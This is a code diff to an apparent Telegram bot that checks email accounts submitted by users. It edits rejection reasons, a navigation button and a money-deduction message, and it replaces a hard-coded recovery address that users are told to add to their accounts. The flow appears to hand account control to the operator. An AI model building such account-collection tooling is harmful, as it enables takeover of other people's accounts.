@@ -2283,10 +2283,10 @@ ADMIN_EV_CB_BACK = "ADMIN_EV_BACK"            # ADMIN_EV_BACK:<days_ago>
 
 NOT_VERIFIED_REASONS = [
     "WRONG PASSWORD 🔑",
-    "NOT COMING",
-    "NOTHING",
-    "PHONE VERY",
-    "WE THINK 💬 YOU NOT",
+    "ASK PHONE VERIFICATION",
+    "ACCOUNT ABNORMAL",
+    "You did not log out of your account from your phone.",
+    "Unknown",
 ]
 
 def _day_bounds_ts(days_ago: int):
@@ -2358,7 +2358,7 @@ async def send_admin_email_verify_menu(update: Update, context: ContextTypes.DEF
     nav = []
     if int(days_ago) < 29:
         nav.append(InlineKeyboardButton("YESTERDAY", callback_data=f"{ADMIN_EV_CB_DAY}:{int(days_ago)+1}"))
-    nav.append(InlineKeyboardButton("BACK 🔙", callback_data="ADMIN_BACK_TO_PANEL"))
+    nav.append(InlineKeyboardButton("BACK 🔙", callback_data=f"{ADMIN_EV_CB_DAY}:{int(days_ago)-1}"))
 
     kb = InlineKeyboardMarkup(buttons + ([nav] if nav else []))
 
@@ -2564,8 +2564,9 @@ async def callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await context.bot.send_message(
                     chat_id=target_user,
                     text=(
-                        "WRONG PASSWORD\n\n"
+                        "YOUR ACCOUNT IS NOT LOGIN ON OUR SIDE.\n\n"
                         f"REASON= {reason}\n"
+                        f"Email= {email}\n"
                         f"DEDUCT MONEY = {PRE_CREDIT_AMOUNT}\n\n"
                         "PLEASE CHECK IT ONCE 🔂 YOUR SELF"
                     ),
@@ -2877,7 +2878,7 @@ async def callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
 
             # Append Recovery email note (email monospace for easy copy)
-            recovery_email = "aadiltyagi459@gmail.com"
+            recovery_email = "gabopuwa355@gmail.com"
             base_text += (
                 "\n________________________\n\n"
                 "🚦 You need to add Recovery email\n"
@@ -3057,7 +3058,7 @@ async def callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
 
             # Append Recovery email note (email monospace for easy copy)
-            recovery_email = "aadiltyagi459@gmail.com"
+            recovery_email = "gabopuwa355@gmail.com"
             base_text += (
                 "\n________________________\n\n"
                 "🚦 You need to add Recovery email\n\n"
